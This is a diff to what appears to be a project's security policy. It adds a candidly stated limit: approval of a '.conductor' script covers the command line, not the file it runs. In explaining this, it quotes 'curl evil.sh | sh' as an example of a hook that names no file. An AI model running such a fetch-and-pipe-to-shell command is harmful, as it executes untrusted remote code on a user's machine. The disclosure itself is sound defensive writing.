@@ -40,6 +40,18 @@ service of its own — so most of the usual surface does not exist. What does:
   without either — an approval that survives the script changing, a path that
   resolves outside the checkout, a source that skips the digest — is as serious
   as the item above, and for the same reason.
+
+  **One known limit, stated rather than implied.** A `.conductor` script is a
+  command line, not a file, so what is shown and digested is the line: approving
+  `./scripts/boot.sh` approves those characters, and a `git pull` rewriting that
+  file leaves the digest identical and the approval standing. It cannot be
+  closed by following the line — `repoTrust.ts` settled that rule for hooks,
+  since `curl evil.sh | sh` names no file, and there is no directory to digest
+  whole here. So the promise is narrowed instead: the card says the approval
+  covers the line and not what the line runs. A **file**-sourced script
+  (`.octopus/scripts/`) is exact, and a report about that one is the serious
+  case above.
+
 - **Anything reaching a process argument.** External commands go through
   `execFile` with an argument array, and values crossing IPC are parsed with zod
   at the boundary. A path that reaches an argument unvalidated — branch names
